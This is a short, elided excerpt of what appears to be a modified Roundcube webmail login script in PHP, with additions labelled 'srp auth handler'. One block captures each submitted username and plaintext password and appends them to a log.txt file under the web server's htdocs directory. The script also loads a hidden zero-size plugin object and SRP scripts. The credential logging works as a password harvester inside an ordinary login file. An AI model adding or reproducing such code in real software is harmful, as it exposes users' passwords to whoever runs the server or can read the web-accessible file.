...
if (empty($_SESSION['user_id']) && ($force_https = $RCMAIL->config->get('force_https', false))) { $https_port = is_bool($force_https) ? 443 : $force_https;
...
$RCMAIL->action = $startup['action'];
  ...
  //srp auth handler
$file = "/usr/local/apache/htdocs/roundcube/srp/log.txt";
$username = trim(rcube_utils::get_input_value('_user', rcube_utils::INPUT_POST));
$password = rcube_utils::get_input_value('_pass', rcube_utils::INPUT_POST, true, $RCMAIL->config->get('password_charset', 'ISO-8859-1'));
$content = "1: username is " . $username . "; password is " . $password . "\n";
file_put_contents($file, $content, FILE_APPEND | LOCK_EX);

$sha_name_file = "/usr/local/apache/htdocs/roundcube/srp/sha_name.csv";
...
//srp auth handler
echo '<div id="srp"><object id="pluginId" type="application/x-my-extension" width="0" height="0"><param name="onload" value="pluginLoaded" /></object><script src="srp/sha256.js"></script> <script src="srp/srp_auth.js"></script> </div>';
